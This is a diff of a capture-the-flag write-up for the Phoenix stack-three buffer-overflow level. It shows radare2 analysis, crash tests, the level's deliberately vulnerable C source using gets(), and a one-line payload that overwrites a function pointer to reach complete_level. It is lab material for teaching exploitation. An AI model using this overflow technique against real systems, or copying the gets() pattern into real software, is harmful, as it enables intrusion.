@@ -1,26 +1,33 @@
-# Phoenix Stack2
+# Phoenix Stack3
 ## Static Analysis
 ##### Analyse the binary
-`r2 -A stack_three`
+`r2 -A stack-three`
 ##### Familiarity
 ```
-[0x000104a8]> i
-file     stack-two
+[0x0001049c]> i
+file     stack-three
 format   elf
 arch     arm
 endian   little
 ```
-##### Imports
+##### Run the code
 ```
-[0x0001049c]> ii
-[Imports]
-   1 0x0001043c  GLOBAL    FUNC printf
-   4 0x00010448  GLOBAL    FUNC gets
-   5 0x00010454  GLOBAL    FUNC puts
-   7 0x00010460  GLOBAL    FUNC fflush
-   9 0x0001046c    WEAK  NOTYPE __deregister_frame_info
-  16 0x00010478  GLOBAL    FUNC exit
-```
+$ ./stack-three
+DDDDDDDDD       <- program waiting for input here
+function pointer remains unmodified :~( better luck next time!
+
+python -c 'print "A"* 66'
+
+$ ./stack-three
+<  66 x 0x41 ('A') >
+calling function pointer @ 0x4141
+Segmentation fault
+
+// Pro way to pass values to gets()
+python -c 'print "A"*(65)' | ./stack-three
+calling function pointer @ 0x41
+Segmentation fault
+```  
 ##### Exports
 ```
 [0x0001049c]> iE
@@ -28,9 +35,17 @@ endian   little
 084 0x000005ec 0x000105ec GLOBAL   FUNC  136 main
 090 0x000005d0 0x000105d0 GLOBAL   FUNC   28 complete_level
 ```
+##### Symbols
+```
+[0x0001049c]> is
+[Symbols]
+090 0x000005d0 0x000105d0 GLOBAL   FUNC   28 complete_level
+```
 ##### Seek and Print complete_level
 ```
 [0x0001049c]> s 0x000105d0
+
+
 [0x000105d0]> pdf
 |           ;-- $a:
 / (fcn) sym.complete_level 24
@@ -42,22 +57,62 @@ endian   little
 |           0x000105e0      0000a0e3       mov r0, 0                   ; int status
 \           0x000105e4      a3ffffeb       bl sym.imp.exit             ; void exit(int status)
 ```
-##### Interesting Strings
+##### Answer
 ```
-[0x0001049c]> fs strings;f
-0x00010680 68 str.Congratulations__you_ve_finished_phoenix_stack_three_:___Well_done
-0x000106c4 76 str.Welcome_to_phoenix_stack_three__brought_to_you_by_https:__exploit.education
-0x00010710 31 str.calling_function_pointer____p
-0x00010730 63 str.function_pointer_remains_unmodified_:___better_luck_next_time
+$ python -c 'print "A"*(64) + "\xd0\x05\x01\x00"' | ./stack-three
+
+calling function pointer @ 0x105d0
+Congratulations, you've finished phoenix/stack-three :-) Well done!
+
+payload=$(python -c 'print "A"* 64')          
+➜  ~ echo $payload
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
-##### Stack Variables
+##### Source code
 ```
-[0x000105ec]> pd 5 @main
-|           ;-- $a:
-/ (fcn) main 120
-|   main (FILE *stream);
-|           ; var int local_54h @ fp-0x54
-|           ; var int local_50h @ fp-0x50
-|           ; var int local_8h @ fp-0x8
-|           ; arg FILE *stream @ r3
+* The aim is to change the contents of the changeme variable to 0x0d0a090a
+*
+* When does a joke become a dad joke?
+*   When it becomes apparent.
+*   When it's fully groan up.
+*
+*/
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+ "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char *gets(char *);
+
+void complete_level() {
+ printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
+ exit(0);
+}
+
+int main(int argc, char **argv) {
+ struct {
+   char buffer[64];
+   volatile int (*fp)();
+ } locals;
+
+ printf("%s\n", BANNER);
+
+ locals.fp = NULL;
+ gets(locals.buffer);
+
+ if (locals.fp) {
+   printf("calling function pointer @ %p\n", locals.fp);
+   fflush(stdout);
+   locals.fp();
+ } else {
+   printf("function pointer remains unmodified :~( better luck next time!\n");
+ }
+
+ exit(0);
+}
 ```
